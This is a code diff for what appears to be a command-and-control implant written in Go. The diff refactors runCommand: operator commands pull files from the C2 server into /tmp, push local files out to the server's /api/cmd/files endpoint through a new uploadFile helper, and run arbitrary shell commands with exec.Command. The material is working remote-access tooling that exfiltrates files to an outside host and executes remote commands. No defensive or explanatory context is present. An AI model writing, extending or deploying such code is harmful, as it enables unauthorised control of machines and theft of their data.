@@ -170,42 +170,27 @@ func runCommand(commandStr string, cmdid string) error {
 			return errors.New("Requires file path")
 		}
 		fmt.Println(arrCommandStr[1])
-		downloadFile("/tmp/"+arrCommandStr[1], c2+"/files/"+arrCommandStr[1])
-		updateCmdStatus(cmdid, "Location: "+arrCommandStr[1])
+		path := arrCommandStr[1]
+		file := filepath.Base(path)
+		fmt.Println(file)
+		downloadFile("/tmp/"+file, c2+"/files/"+file)
+		updateCmdStatus(cmdid, "Location: /tmp/"+file)
 		return nil
 	case "download":
 		if len(arrCommandStr) < 1 {
 			return errors.New("Requires file path")
 		}
 		fmt.Println("Downloading file")
-
-		path, _ := os.Getwd()
-		path += "/" + arrCommandStr[1]
-		//file := arrCommandStr[1]
-		extraParams := map[string]string{
-			"operator": "none",
-		}
-		request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
-		if err != nil {
-			log.Fatal(err)
-		}
-		client := &http.Client{}
-		resp, err := client.Do(request)
-		if err != nil {
-			log.Fatal(err)
+		if strings.Contains(arrCommandStr[1], "/") {
+			path := arrCommandStr[1]
+			tempfile := uploadFile(path, c2)
+			updateCmdStatus(cmdid, "Location: "+tempfile)
 		} else {
-			body := &bytes.Buffer{}
-			_, err := body.ReadFrom(resp.Body)
-			if err != nil {
-				log.Fatal(err)
-			}
-			resp.Body.Close()
-			fmt.Println(resp.StatusCode)
-			fmt.Println(resp.Header)
-			fmt.Println(body)
+			path, _ := os.Getwd()
+			path += "/" + arrCommandStr[1]
+			tempfile := uploadFile(path, c2)
+			updateCmdStatus(cmdid, "Location: "+tempfile)
 		}
-
-		updateCmdStatus(cmdid, "Location: "+path)
 		return nil
 	default:
 		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
@@ -223,6 +208,33 @@ func runCommand(commandStr string, cmdid string) error {
 		return nil
 	}
 	return nil
+}
+
+func uploadFile(path string, c2 string) string {
+	extraParams := map[string]string{
+		"operator": "none",
+	}
+	request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
+	if err != nil {
+		log.Fatal(err)
+	}
+	client := &http.Client{}
+	resp, err := client.Do(request)
+	if err != nil {
+		log.Fatal(err)
+	} else {
+		body := &bytes.Buffer{}
+		_, err := body.ReadFrom(resp.Body)
+		if err != nil {
+			log.Fatal(err)
+		}
+		resp.Body.Close()
+		//fmt.Println(resp.StatusCode)
+		//fmt.Println(resp.Header)
+		fmt.Println(body.String())
+		return body.String()
+	}
+	return ""
 }
 
 func updateCmdStatus(cmdid string, output string) {
